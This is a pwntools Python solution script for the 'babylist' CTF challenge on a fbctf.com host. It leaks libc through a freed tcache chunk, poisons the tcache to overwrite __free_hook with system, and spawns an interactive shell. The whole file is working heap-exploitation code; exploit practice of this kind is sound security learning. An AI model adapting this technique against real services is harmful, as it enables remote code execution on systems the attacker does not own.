from pwn import *

#p=process('./babylist')
p=remote("challenges3.fbctf.com", 1343)

sla = lambda x,y: p.sendlineafter(x,y)
ru = lambda x : p.recvuntil(x)
rl = lambda : p.recvline()
go = lambda : p.interactive()

def create(name):
    sla(">",'1')
    sla("list:",name)

def add(idx,num):
    sla(">",'2')
    sla("list:",str(idx))
    sla("add:",str(num))

def view(idx1,idx2):
    sla(">",'3')
    sla("list:",str(idx1))
    sla("list:",str(idx2))

def dup(idx,name):
    sla(">","4")
    sla("list:",str(idx))
    sla("list:",name)

def remove(idx):
    sla(">","5")
    sla("list:",str(idx))

#[1] LEAK
log.info("DO LEAK!")
for i in range(8):
    log.info("MAKE CHUNK "+str(i+1))
    create("HELLOWORLD"+str(i))
    for j in range(32):
        add(i,j)

log.info("MAKE CHUNK DONE")

dup(7,"LEAK")
for i in range(8):
    add(i,64)
log.info("FILL TCACHE DONE")

remove(7)

view(8,0)
ru("[0] = ")
leak = int(rl()[:-1])
view(8,1)
ru("[1] = ")
leak += int(rl()[:-1])<<32
lb = leak - 0x3ebca0
free_hook = lb + 0x3ed8e8
system = lb + 0x4f440
success("libc_base :"+hex(lb))
remove(8)

#[2] EXPLOIT
log.info("DO EXPLOIT!")
create("HELLOWORLD")
for i in range(16):
    add(7,i)
dup(7,"EXPLOIT")
add(7,123)
add(8,123)
remove(7)
remove(8)

log.info("OVERWRITE_FD")
create("OVERWRITE_FD")
add(7,free_hook&0xffffffff)
add(7,free_hook>>32)
for i in range(7):
    add(7,i)

create("OVERWRITE_FD")
add(8,free_hook&0xffffffff)
add(8,free_hook>>32)
for i in range(7):
    add(8,i)

log.info("OVERWRITE_FREE_HOOK")
create("OVERWRITE_FREE_HOOK")
add(9,system&0xffffffff)
add(9,system>>32)
for i in range(7):
    add(9,0)

remove(7)
log.info("GET SHELL")
create("TRIGGER")
sh = u64("/bin/sh\x00")
add(7,sh&0xffffffff)
add(7,sh>>32)
add(7,1)
go()
